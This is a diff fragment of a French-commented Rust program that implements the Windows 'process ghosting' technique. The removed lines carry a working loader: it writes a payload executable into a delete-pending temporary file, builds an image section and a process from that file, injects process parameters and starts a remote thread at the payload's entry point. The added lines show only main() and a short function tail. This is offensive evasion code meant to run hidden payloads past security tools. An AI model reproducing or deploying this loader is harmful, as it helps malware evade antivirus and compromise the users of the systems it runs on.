-        null_mut(),
-        null_mut(),            // toute la taille du fichier
-        PAGE_READONLY,
-        SEC_IMAGE,
-        *h_file,
-    ) };
-    if !NT_SUCCESS(status) {
-        eprintln!("[!] NtCreateSection() failed! (0x{:X})", status as u32);
-        return None;
-    }
-    if h_section.is_null() || h_section == INVALID_HANDLE_VALUE {
-        eprintln!(
-            "[!] Le handle retourné par NtCreateSection() est invalide (0x{:X})",
-            status as u32
-        );
-        return None;
-    }
-
-    println!("[+] J'ai mon objet section");
-    // On retourne le handle de section comme pointeur
-    Some(h_section as LPVOID)
-}
-
-unsafe fn prepare_target(cible:&str) -> Option<PVOID>{
-    let h_file = unsafe {CreateFileA(
-         cible.as_ptr() as *const _,
-         DELETE | SYNCHRONIZE | FILE_GENERIC_READ | FILE_GENERIC_WRITE,
-         FILE_SHARE_READ | FILE_SHARE_WRITE,
-         null_mut(),
-         OPEN_ALWAYS,
-         FILE_ATTRIBUTE_NORMAL,
-         null_mut())
-    };
-    if h_file == INVALID_HANDLE_VALUE {
-        println!("[!] CreateFileA Failed: {}", unsafe{GetLastError()});
-        return None;
-    }
-    println!("[+] Création du fichier: {cible}");
-
-    let mut io_status: IO_STATUS_BLOCK = unsafe{zeroed()};
-
-    let mut f_fileinfo = FILE_DISPOSITION_INFO {
-        DeleteFile: 1,
-    };
-    let status: NTSTATUS = unsafe{NtSetInformationFile(
-        h_file,
-        &mut io_status,
-        &mut f_fileinfo as *mut _ as *mut _, //pour quoi as mut as mut wtf
-        size_of::<FILE_DISPOSITION_INFO>() as u32,
-        FileDispositionInformation,
-    )};
-
-    if status != STATUS_SUCCESS {
-        println!("[!] NtSetInformationFile failed: 0x{:X}", status);
-        unsafe{CloseHandle(h_file)};
-        return None;
-    }
-    println!("[+] Le fichier a été mis en DELETE-PENDING");
-    return Some(h_file as PVOID);
-
-}
-
-unsafe fn process_ghosting(t_file:&str,payload:&str) -> Result<(), Error>{
-       
-    println!("[+] Le fichier temporaire : {t_file}");
-    println!("[+] Le payload : {payload}");
-    
-    if let Err(e) = fs::metadata(payload) {
-        println!("[!] Erreur d'accès au fichier cible : {}", e);
-        return Err(Error::from(STATUS_OBJECT_NAME_NOT_FOUND)); 
-    }
-    //On prépare la cible (ouverture du fichier temporaire en delete pending)
-    let h_file = match unsafe{prepare_target(t_file)} {
-        Some(handle) => handle,
-        None => return Err(Error::from(STATUS_INVALID_PARAMETER)),
-    };
-    println!("[+] Handle de fichier obtenu: {:?}", h_file);
-
-    //On lit le vrai exe pour le mettre en mémoire
-    let (payload_bytes,payload_size) = unsafe { read_payload(payload).ok_or_else(|| Error {status:STATUS_INVALID_PARAMETER}) }?;
-        println!("[+] Payload chargé {} bytes", payload_size);
-
-    
-    //On va écrire le payload dans le fichier temporaire et créer la section Object
-    let h_section = match unsafe {write_payload(&h_file, payload_bytes, payload_size)} {
-        Some(handle) => handle,
-        None => return Err(Error::from(STATUS_INVALID_PARAMETER))
-    };
-    
-       println!("[+] Section créée: {:?}", h_section);
-    //Mapper le fichier dans le format PE et fetch un pointer à NT struct header
-    // entry point
-    let entry_rva = unsafe { get_ep_rva(payload_bytes) };
-    if entry_rva == 0 {
-        println!("[!] Erreur car Entry_point = 0 ");
-        unsafe { CloseHandle(h_section) };
-        return Err(Error::from(STATUS_INVALID_PARAMETER));
-    }
-    println!("[+] Entry point (RVA): 0x{:X}", entry_rva);
-    
-    //On peut delete le fichier mtn
-    unsafe { CloseHandle(h_file) };
-    // Mapping de la section dans notre processus
-     let (local_base, local_size) = unsafe { map_section_local(h_section as HANDLE)
-        .ok_or_else(|| {
-            CloseHandle(h_section as HANDLE);
-            Error::from(STATUS_INVALID_PARAMETER)
-        }) }?;
-    println!(
-        "[+] Section mappée localement @ {:p} (taille 0x{:X})",
-        local_base, local_size
-    );
-
-     //Création du process ghosted
-    let cp_info = unsafe { create_process(h_section as HANDLE)
-        .ok_or_else(|| {
-            CloseHandle(h_section as HANDLE);
-            Error::from(STATUS_INVALID_PARAMETER)
-        }) }?;
-    let cp_ref: &CPInfo = unsafe { &*cp_info };
-    let h_process  = cp_ref.p_handle;
-
-     let remote_base = unsafe { map_section_remote(h_section as HANDLE, h_process)
-        .ok_or_else(|| {
-            CloseHandle(h_section as HANDLE);
-            CloseHandle(h_process);
-            Error::from(STATUS_INVALID_PARAMETER)
-        }) }?;
-    println!(
-        "[+] Section mappée dans l'enfant @ {:p}",
-        remote_base
-    );
-
-     let entry_addr = (remote_base as usize).checked_add(entry_rva as usize)
-        .ok_or_else(|| Error::from(STATUS_INVALID_PARAMETER))?;
-    println!("[+] Adresse d'entrée absolue: 0x{:X}", entry_addr);
-       // On passe le chemin du binaire ghosted comme image_path et
-    // la ligne de commande qu'on veut lui fournir (ici juste son propre nom).
-    let image_path = t_file;
-    let cmd_line = format!("\"{}\"", t_file);  
-    
-    let p_params = unsafe { build_process_parameters(image_path, &cmd_line)
-        .ok_or_else(|| {
-            CloseHandle(h_section as HANDLE);
-            CloseHandle(h_process);
-            Error::from(STATUS_INVALID_PARAMETER)
-        }) }?;
-    println!("[+] ProcessParameters construits en mémoire locale");
-    // injecter dans le process enfant
-    let remote_params = unsafe { inject_process_parameters(h_process, &cp_ref.pb_info, p_params)
-        .map_err(|e| {
-            // cleanup en cas d'erreur
-            CloseHandle(h_section as HANDLE);
-            CloseHandle(h_process);
-            e
-        }) }?;
-    println!(
-        "[+] ProcessParameters injectés à l'adresse distante {:p}",
-        remote_params
-    );
-    //ENFIN, on peut créer le thread et lancer le payload
-     let h_thread = unsafe { create_remote_thread(h_process, entry_addr as PVOID, false)
-        .map_err(|e| {
-            CloseHandle(h_section as HANDLE);
-            CloseHandle(h_process);
-            e
-        }) }?;
-    println!("[+] Thread créé, handle = {:?}", h_thread);
-        
-    let mut exit_code = 0u32;
-    unsafe { GetExitCodeProcess(h_process, &mut exit_code) };
-    println!("[+] Exit code du processus distant : {:#X}", exit_code);
-
-    unsafe{
-        WaitForSingleObject(h_thread, INFINITE);
-        CloseHandle(h_thread);
-        CloseHandle(h_section);
-        CloseHandle(h_process);
-    }
-    let mut exit = 0u32;
-unsafe { GetExitCodeProcess(h_process, &mut exit) };
-println!("[+] Process exit code: 0x{:X}", exit);
-    Ok(())
+    println!("[+] Ghost Process Executed");
+     Ok(())
 }
 
 fn main() {
     let args: Vec<String> = env::args().collect();
-    if args.len() < 3 {
-        let procname = Path::new(args[0].as_str())
-            .file_name()
-            .unwrap()
-            .to_str()
-            .unwrap();
-        println!("Usage: {} <temp_file> <payload>", procname);
+    if args.len() != 3 {
+        eprintln!("Usage: {} <target_path> <payload_path>", args[0]);
         std::process::exit(1);
     }
-    let t_file = &args[1];
+    let target = &args[1];
     let payload = &args[2];
-
     unsafe {
-        match process_ghosting(t_file, payload) {
-            Ok(()) => println!("[+] Le process ghosting a fonctionné !"),
-            Err(err) => println!("[!] Error: 0x{:x}", err.status),
+        match process_ghosting(target, payload) {
+            Ok(()) => println!("[+] Ghosting terminé avec succès."),
+            Err(err) => eprintln!("[!] Erreur: 0x{:X}", err.status),
         }
     }
 }
-
